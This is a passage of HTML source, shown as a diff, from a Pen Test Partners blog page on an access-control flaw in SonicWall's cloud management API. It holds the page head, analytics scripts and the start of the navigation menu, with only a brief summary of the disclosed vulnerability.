@@ -1,0 +1,921 @@
+<!doctype html>
+<html xmlns:svg="//www.w3.org/2000/svg">
+<head>
+    <meta http-equiv="Content-Type"
+          content="text/html; charset=UTF-8"/>
+    <meta name="viewport"
+          content="width=device-width,  maximum-initial-scale=1,scale=12.0, minimum-scale=.25, user-scalable=yes"/>
+
+    <meta name="HOSTNAME" content="alvin">
+
+    <link rel="alternate"
+          href="https://www.pentestpartners.com"
+          hreflang="en-gb"/>
+
+    
+
+    <link rel="shortcut icon"
+          href="https://www.pentestpartners.com/content/themes/pentestpartners2019/faviconx.ico"/>
+    <link rel="apple-touch-icon"
+          href="https://www.pentestpartners.com/content/themes/pentestpartners2019/apple-touch-icon.png">
+    <link rel="apple-touch-icon-precomposed"
+          href="https://www.pentestpartners.com/content/themes/pentestpartners2019/apple-touch-icon-precomposed.png">
+
+    <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,400,700'
+          rel='stylesheet'
+          type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Source+Serif+Pro'
+          rel='stylesheet'
+          type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Source+Code+Pro'
+          rel='stylesheet'
+          type='text/css'>
+
+    <link rel="stylesheet"
+          href="https://www.pentestpartners.com/content/themes/pentestpartners2019/style.css"
+          type="text/css"
+          media="screen"/>
+    <link rel="alternate"
+          type="application/rss+xml"
+          title="Pen Test Partners RSS Feed"
+          href="https://www.pentestpartners.com/feed/"/>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+	})(window,document,'script','dataLayer','GTM-5CQ6NHF5');</script>
+<!-- End Google Tag Manager -->
+
+	<script
+				type="text/javascript"
+				src="https://app.termly.io/resource-blocker/b342aaba-f883-4d89-a6fa-d7868e2ada8f?autoBlock=on">
+			</script>
+		<!-- All in One SEO 4.5.4 - aioseo.com -->
+		<title>Cloud firewall management API SNAFU put 500k SonicWall customers at risk | Pen Test Partners</title>
+		<meta name="description" content="TL;DR I found an IDOR in SonicWall&#039;s cloud management platform API Any user could add themselves to any account at any organisation using it Anyone could create a user account to exploit the issue, from the public internet Can be used to change firewall rules, or add rogue VPN users, for example Results in trivial" />
+		<meta name="robots" content="max-image-preview:large" />
+		<link rel="canonical" href="https://www.pentestpartners.com/security-blog/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk/" />
+		<meta name="generator" content="All in One SEO (AIOSEO) 4.5.4" />
+
+		<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-099PKGM7MZ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-099PKGM7MZ');
+</script>
+		<meta name="google" content="nositelinkssearchbox" />
+		<script type="application/ld+json" class="aioseo-schema">
+			{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#article","name":"Cloud firewall management API SNAFU put 500k SonicWall customers at risk | Pen Test Partners","headline":"Cloud firewall management API SNAFU put 500k SonicWall customers at risk","author":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/author\/vangelis-stykas\/#author"},"publisher":{"@id":"https:\/\/www.pentestpartners.com\/#organization"},"image":{"@type":"ImageObject","url":"https:\/\/www.pentestpartners.com\/content\/uploads\/2020\/09\/swall-headline-captioned.png","width":1000,"height":500},"datePublished":"2020-09-02T12:00:10+01:00","dateModified":"2020-10-01T08:51:34+01:00","inLanguage":"en-GB","mainEntityOfPage":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#webpage"},"isPartOf":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#webpage"},"articleSection":"Security Blog, Vulnerability Advisory"},{"@type":"BreadcrumbList","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/www.pentestpartners.com\/#listItem","position":1,"name":"Home","item":"https:\/\/www.pentestpartners.com\/","nextItem":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#listItem","position":2,"name":"Cloud firewall management API SNAFU put 500k SonicWall customers at risk","previousItem":"https:\/\/www.pentestpartners.com\/#listItem"}]},{"@type":"Organization","@id":"https:\/\/www.pentestpartners.com\/#organization","name":"Pen Test Partners","url":"https:\/\/www.pentestpartners.com\/"},{"@type":"Person","@id":"https:\/\/www.pentestpartners.com\/security-blog\/author\/vangelis-stykas\/#author","url":"https:\/\/www.pentestpartners.com\/security-blog\/author\/vangelis-stykas\/","name":"Vangelis Stykas","image":{"@type":"ImageObject","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/bc785a43c433ed698ef97039329a3305?s=96&d=mm&r=g","width":96,"height":96,"caption":"Vangelis Stykas"}},{"@type":"WebPage","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#webpage","url":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/","name":"Cloud firewall management API SNAFU put 500k SonicWall customers at risk | Pen Test Partners","description":"TL;DR I found an IDOR in SonicWall's cloud management platform API Any user could add themselves to any account at any organisation using it Anyone could create a user account to exploit the issue, from the public internet Can be used to change firewall rules, or add rogue VPN users, for example Results in trivial","inLanguage":"en-GB","isPartOf":{"@id":"https:\/\/www.pentestpartners.com\/#website"},"breadcrumb":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#breadcrumblist"},"author":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/author\/vangelis-stykas\/#author"},"creator":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/author\/vangelis-stykas\/#author"},"image":{"@type":"ImageObject","url":"https:\/\/www.pentestpartners.com\/content\/uploads\/2020\/09\/swall-headline-captioned.png","@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#mainImage","width":1000,"height":500},"primaryImageOfPage":{"@id":"https:\/\/www.pentestpartners.com\/security-blog\/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk\/#mainImage"},"datePublished":"2020-09-02T12:00:10+01:00","dateModified":"2020-10-01T08:51:34+01:00"},{"@type":"WebSite","@id":"https:\/\/www.pentestpartners.com\/#website","url":"https:\/\/www.pentestpartners.com\/","name":"Pen Test Partners","inLanguage":"en-GB","publisher":{"@id":"https:\/\/www.pentestpartners.com\/#organization"}}]}
+		</script>
+		<!-- All in One SEO -->
+
+<link rel='dns-prefetch' href='//static.addtoany.com' />
+<link rel='dns-prefetch' href='//www.pentestpartners.com' />
+<link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.pentestpartners.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=c0f57036ea7d7ae50dc521d5f32681b1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://www.pentestpartners.com/wp-includes/css/dist/block-library/style.min.css?ver=c0f57036ea7d7ae50dc521d5f32681b1' type='text/css' media='all' />
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='rotatingtweets-css' href='https://www.pentestpartners.com/content/plugins/rotatingtweets/css/style.css?ver=c0f57036ea7d7ae50dc521d5f32681b1' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-pagenavi-css' href='https://www.pentestpartners.com/content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70' type='text/css' media='all' />
+<link rel='stylesheet' id='ptp-css-css' href='https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/main.css?id=98fbd4c463348d03427e&#038;ver=c0f57036ea7d7ae50dc521d5f32681b1' type='text/css' media='all' />
+<link rel='stylesheet' id='addtoany-css' href='https://www.pentestpartners.com/content/plugins/add-to-any/addtoany.min.css?ver=1.16' type='text/css' media='all' />
+<link rel="https://api.w.org/" href="https://www.pentestpartners.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.pentestpartners.com/wp-json/wp/v2/posts/21083" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.pentestpartners.com/xmlrpc.php?rsd" />
+
+<link rel='shortlink' href='https://www.pentestpartners.com/?p=21083' />
+<link rel="alternate" type="application/json+oembed" href="https://www.pentestpartners.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.pentestpartners.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&#038;format=xml" />
+<meta name="generator" content="Site Kit by Google 1.142.0" /><meta name="tec-api-version" content="v1"><meta name="tec-api-origin" content="https://www.pentestpartners.com"><link rel="alternate" href="https://www.pentestpartners.com/wp-json/tribe/events/v1/" /><script type="text/javascript" src="https://www.pentestpartners.com/content/plugins/jquery-updater/js/jquery-3.7.1.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://www.pentestpartners.com/content/plugins/jquery-updater/js/jquery-migrate-3.4.1.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+
+<!-- Google Tag Manager snippet added by Site Kit -->
+<script type="text/javascript">
+/* <![CDATA[ */
+
+			( function( w, d, s, l, i ) {
+				w[l] = w[l] || [];
+				w[l].push( {'gtm.start': new Date().getTime(), event: 'gtm.js'} );
+				var f = d.getElementsByTagName( s )[0],
+					j = d.createElement( s ), dl = l != 'dataLayer' ? '&l=' + l : '';
+				j.async = true;
+				j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+				f.parentNode.insertBefore( j, f );
+			} )( window, document, 'script', 'dataLayer', 'GTM-5CQ6NHF5' );
+			
+/* ]]> */
+</script>
+
+<!-- End Google Tag Manager snippet added by Site Kit -->
+<link rel="icon" href="https://www.pentestpartners.com/content/uploads/2017/11/cropped-PTPsiteIcon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://www.pentestpartners.com/content/uploads/2017/11/cropped-PTPsiteIcon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://www.pentestpartners.com/content/uploads/2017/11/cropped-PTPsiteIcon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://www.pentestpartners.com/content/uploads/2017/11/cropped-PTPsiteIcon-270x270.png" />
+
+
+</head>
+
+
+<body class="post-template-default single single-post postid-21083 single-format-standard wp-embed-responsive tribe-no-js">
+
+<!-- Google Tag Manager (noscript) -->
+<noscript>
+<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5CQ6NHF5" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+</noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<header id="site-header">
+
+    <div class="container">
+
+        <div id="site-logo">
+            <a href="https://www.pentestpartners.com">
+                <div class="inner">
+                    <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-ptp.png"
+                         alt="Pen Test Partners Logo">
+                    <p id="strapline">Security consulting and testing services</p>
+                </div>
+            </a>
+        </div>
+
+        <div id="header-phone">
+				<a href="tel:+442030950500" style="text-decoration: none; color : #a93545" >
+            <div class="inner">
+                <i class="fas fa-phone"></i> +44 20 3095 0500
+            </div>
+				<a href="tel:+16466932501" style="text-decoration: none; color : #a93545" >
+            <div class="inner">
+                <i class="fas fa-phone"></i> +1 646 693 2501
+            </div>
+				</a>
+        </div>
+
+        <div id="header-nav">
+
+            <div class="inner">
+
+				<ul id="menu-main" class="menu"><li id="menu-item-3403" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3403"><a href="https://www.pentestpartners.com/about-us/">About</a>
+<ul class="sub-menu">
+	<li id="menu-item-25845" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-25845"><a href="https://www.pentestpartners.com/about-us/ptp-in-the-usa/">PTP in the USA</a></li>
+	<li id="menu-item-8901" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8901"><a href="https://www.pentestpartners.com/about-us/careers/">Careers</a></li>
+	<li id="menu-item-24949" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24949"><a href="https://www.pentestpartners.com/our-vision-and-values/">Our Vision and Values</a></li>
+	<li id="menu-item-3484" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3484"><a href="https://www.pentestpartners.com/about-us/in-the-news/">In the news</a></li>
+	<li id="menu-item-23880" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23880"><a href="https://www.pentestpartners.com/about-us/environmental-statement/">Environmental Statement</a></li>
+	<li id="menu-item-18243" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18243"><a href="https://www.pentestpartners.com/about-us/vulnerability-disclosure-policy/">Vulnerability Disclosure Policy</a></li>
+</ul>
+</li>
+<li id="menu-item-3404" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3404"><a href="https://www.pentestpartners.com/penetration-testing-services/">Services</a>
+<ul class="sub-menu">
+	<li id="menu-item-17288" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-17288"><a href="https://www.pentestpartners.com/penetration-testing-services/red-teaming/">Red Teaming</a></li>
+	<li id="menu-item-23851" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23851"><a href="https://www.pentestpartners.com/penetration-testing-services/purple-teaming/">Purple Teaming</a></li>
+	<li id="menu-item-3486" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3486"><a href="https://www.pentestpartners.com/penetration-testing-services/penetration-testing/">Penetration Testing</a></li>
+	<li id="menu-item-23176" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23176"><a href="https://www.pentestpartners.com/penetration-testing-services/agile-environment-testing/">Agile Environment Testing</a></li>
+	<li id="menu-item-17515" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-17515"><a href="https://www.pentestpartners.com/penetration-testing-services/aviation-cyber-security-testing/">Aviation Cyber Security Testing</a></li>
+	<li id="menu-item-8926" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8926"><a href="https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/">Automotive &#038; IoT Testing</a></li>
+	<li id="menu-item-10522" class="services-icon maritime menu-item menu-item-type-post_type menu-item-object-page menu-item-10522"><a href="https://www.pentestpartners.com/penetration-testing-services/maritime-cyber-security-testing/">Maritime Cyber Security Testing</a></li>
+	<li id="menu-item-21980" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21980"><a href="https://www.pentestpartners.com/penetration-testing-services/cloud-services-security/">Cloud Services Security</a></li>
+	<li id="menu-item-21846" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21846"><a href="https://www.pentestpartners.com/devops-lifecycle-assurance/">DevOps Lifecycle Assurance</a></li>
+	<li id="menu-item-3489" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3489"><a href="https://www.pentestpartners.com/penetration-testing-services/social-engineering/">Social Engineering</a></li>
+	<li id="menu-item-11000" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11000"><a href="https://www.pentestpartners.com/penetration-testing-services/physical-security/">Physical Security</a></li>
